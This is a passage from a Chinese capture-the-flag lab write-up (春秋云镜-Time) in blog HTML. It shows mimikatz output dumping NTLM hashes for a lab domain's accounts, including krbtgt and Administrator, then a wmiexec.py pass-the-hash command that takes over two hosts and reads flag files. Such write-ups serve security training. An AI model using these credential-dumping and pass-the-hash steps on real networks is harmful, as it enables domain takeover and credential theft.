+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1142</span><span class="w">    </span><span class="n">tangrong</span><span class="w">        </span><span class="mi">2</span><span class="n">a38158c55abe6f6fe4b447fbc1a3e74</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1143</span><span class="w">    </span><span class="n">zhufeng</span><span class="w"> </span><span class="mi">71</span><span class="n">e03af8648921a3487a56e4bb8b5f53</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1145</span><span class="w">    </span><span class="n">dongcheng</span><span class="w">       </span><span class="n">f2fdf39c9ff94e24cf185a00bf0a186d</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1146</span><span class="w">    </span><span class="n">lianhuangchen</span><span class="w">   </span><span class="mi">23</span><span class="n">dc8b3e465c94577aa8a11a83c001af</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1147</span><span class="w">    </span><span class="n">lili</span><span class="w">    </span><span class="n">b290a36500f7e39beee8a29851a9f8d5</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1148</span><span class="w">    </span><span class="n">huabi</span><span class="w">   </span><span class="mi">02</span><span class="n">fe5838de111f9920e5e3bb7e009f2f</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1149</span><span class="w">    </span><span class="n">rangsibo</span><span class="w">        </span><span class="mi">103</span><span class="n">d0f70dc056939e431f9d2f604683c</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1150</span><span class="w">    </span><span class="n">wohua</span><span class="w">   </span><span class="n">cfcc49ec89dd76ba87019ca26e5f7a50</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1151</span><span class="w">    </span><span class="n">haoguang</span><span class="w">        </span><span class="mi">33</span><span class="n">efa30e6b3261d30a71ce397c779fda</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1152</span><span class="w">    </span><span class="n">langying</span><span class="w">        </span><span class="mi">52</span><span class="n">a8a125cd369ab16a385f3fcadc757d</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1153</span><span class="w">    </span><span class="n">diaocai</span><span class="w"> </span><span class="n">a14954d5307d74cd75089514ccca097a</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1154</span><span class="w">    </span><span class="n">lianggui</span><span class="w">        </span><span class="mi">4</span><span class="n">ae2996c7c15449689280dfaec6f2c37</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1155</span><span class="w">    </span><span class="n">manxue</span><span class="w">  </span><span class="mi">0255</span><span class="n">c42d9f960475f5ad03e0fee88589</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1156</span><span class="w">    </span><span class="n">baqin</span><span class="w">   </span><span class="mi">327</span><span class="n">f2a711e582db21d9dd6d08f7bdf91</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1157</span><span class="w">    </span><span class="n">chengqiu</span><span class="w">        </span><span class="mi">0</span><span class="n">d0c1421edf07323c1eb4f5665b5cb6d</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1158</span><span class="w">    </span><span class="n">louyou</span><span class="w">  </span><span class="n">a97ba112b411a3bfe140c941528a4648</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1159</span><span class="w">    </span><span class="n">maqun</span><span class="w">   </span><span class="mi">485</span><span class="n">c35105375e0754a852cee996ed33b</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1160</span><span class="w">    </span><span class="n">wenbiao</span><span class="w"> </span><span class="mi">36</span><span class="n">b6c466ea34b2c70500e0bfb98e68bc</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1161</span><span class="w">    </span><span class="n">weishengshan</span><span class="w">    </span><span class="n">f60a4233d03a2b03a7f0ae619c732fae</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1163</span><span class="w">    </span><span class="n">chuyuan</span><span class="w"> </span><span class="mi">0</span><span class="n">cfdca5c210c918b11e96661de82948a</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1164</span><span class="w">    </span><span class="n">wenliang</span><span class="w">        </span><span class="n">a4d2bacaf220292d5fdf9e89b3513a5c</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1165</span><span class="w">    </span><span class="n">yulvxue</span><span class="w"> </span><span class="n">cf970dea0689db62a43b272e2c99dccd</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1166</span><span class="w">    </span><span class="n">luyue</span><span class="w">   </span><span class="mi">274</span><span class="n">d823e941fc51f84ea323e22d5a8c4</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1167</span><span class="w">    </span><span class="n">ganjian</span><span class="w"> </span><span class="mi">7</span><span class="n">d3c39d94a272c6e1e2ffca927925ecc</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1168</span><span class="w">    </span><span class="n">pangzhen</span><span class="w">        </span><span class="mi">51</span><span class="n">d37e14983a43a6a45add0ae8939609</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1169</span><span class="w">    </span><span class="n">guohong</span><span class="w"> </span><span class="n">d3ce91810c1f004c782fe77c90f9deb6</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1170</span><span class="w">    </span><span class="n">lezhong</span><span class="w"> </span><span class="n">dad3990f640ccec92cf99f3b7be092c7</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1171</span><span class="w">    </span><span class="n">sheweiyue</span><span class="w">       </span><span class="n">d17aecec7aa3a6f4a1e8d8b7c2163b35</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1172</span><span class="w">    </span><span class="n">dujian</span><span class="w">  </span><span class="mi">8</span><span class="n">f7846c78f03bf55685a697fe20b0857</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1173</span><span class="w">    </span><span class="n">lidongjin</span><span class="w">       </span><span class="mi">34638</span><span class="n">b8589d235dea49e2153ae89f2a1</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1174</span><span class="w">    </span><span class="n">hongqun</span><span class="w"> </span><span class="mi">6</span><span class="n">c791ef38d72505baeb4a391de05b6e1</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1175</span><span class="w">    </span><span class="n">yexing</span><span class="w">  </span><span class="mi">34842</span><span class="n">d36248c2492a5c9a1ae5d850d54</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1176</span><span class="w">    </span><span class="n">maoda</span><span class="w">   </span><span class="mi">6</span><span class="n">e65c0796f05c0118fbaa8d9f1309026</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1177</span><span class="w">    </span><span class="n">qiaomei</span><span class="w"> </span><span class="mi">6</span><span class="n">a889f350a0ebc15cf9306687da3fd34</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">502</span><span class="w">     </span><span class="n">krbtgt</span><span class="w">  </span><span class="n">a4206b127773884e2c7ea86cdd282d9c</span><span class="w">        </span><span class="mi">514</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1178</span><span class="w">    </span><span class="n">wenshao</span><span class="w"> </span><span class="n">b31c6aa5660d6e87ee046b1bb5d0ff79</span><span class="w">        </span><span class="mi">4260352</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">500</span><span class="w">     </span><span class="n">Administrator</span><span class="w">   </span><span class="mi">04</span><span class="n">d93ffd6f5f6e4490e0de23f240a5e9</span><span class="w">        </span><span class="mi">512</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1000</span><span class="w">    </span><span class="n">DC</span><span class="o">-</span><span class="n">PROGAME</span><span class="err">$</span><span class="w">     </span><span class="n">bc2240b6ee8e5c732532bd9119a0ee52</span><span class="w">        </span><span class="mi">532480</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1181</span><span class="w">    </span><span class="n">WIN2019</span><span class="err">$</span><span class="w">        </span><span class="n">dfc88569cfb25383cce0d894fa8bb9ea</span><span class="w">        </span><span class="mi">4096</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1179</span><span class="w">    </span><span class="n">zhangxin</span><span class="w">        </span><span class="n">d6c5976e07cdb410be19b84126367e3d</span><span class="w">        </span><span class="mi">4260352</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1180</span><span class="w">    </span><span class="n">yuxuan</span><span class="w">  </span><span class="mi">376</span><span class="n">ece347142d1628632d440530e8eed</span><span class="w">        </span><span class="mi">66048</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nf">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span><span class="w"> </span><span class="c1"># exit  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Bye</span><span class="o">!</span><span class="w">  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到域管理直接<code>pth</code><br>
+<code>500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(icmp) Target 172.22.6.12     is alive  
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.6.25     is alive  </span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 wmiexec.py xiaorang.lab/Administrator@172.22.6.25 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">type C:\Users\Administrator\flag\flag*  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">flag03: flag{45543a92-4eaa-4b8e-9d27-be88069bb34a}  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">python3 wmiexec.py xiaorang.lab/Administrator@172.22.6.12 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">flag04: flag{d5a8e81f-3ee6-49d1-9bc2-c1f4e074e710}  </span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-05-07 19:17:46">Updated on 2025-05-07&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nlrvana.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time/" data-title="春秋云镜-Time"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/adcs/" class="post-tag" title="Tags - ADCS">ADCS</a><a href="/tags/%E6%BB%A5%E7%94%A8sid/" class="post-tag" title="Tags - 滥用SID">滥用SID</a><a href="/tags/asreproast/" class="post-tag" title="Tags - ASREProast">ASREProast</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/" class="post-nav-item" rel="prev" title="春秋云镜-Certify"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>春秋云镜-Certify</a><a href="/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" class="post-nav-item" rel="next" title="委派攻击">委派攻击<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.145.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.15"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div><div class="footer-line visitor order-1">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":true},"version":"v0.3.15"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
